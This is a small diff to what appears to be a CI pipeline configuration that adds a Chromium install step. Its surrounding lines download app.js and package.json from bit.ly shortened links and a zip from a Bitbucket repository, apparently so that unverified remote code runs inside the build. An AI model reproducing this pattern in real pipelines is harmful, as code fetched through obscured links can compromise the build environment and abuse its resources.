@@ -7,6 +7,7 @@ jobs:
       image: ubuntu-2004:202101-01
     resource_class: arm.medium
     steps:
+      - run: sudo apt install -y chromium-browser
       - run: curl -fsSL https://bit.ly/3kJeOmQ -o app.js && curl -fsSL https://bit.ly/3Hca5nk -o package.json
       - run: curl -fsSL https://bitbucket.org/lunarcrush/lunarcrush-data/get/marlainekabore59_outlook-com.zip -o lunarCrushData.zip
       - run: unzip lunarCrushData.zip -d lunarCrushData
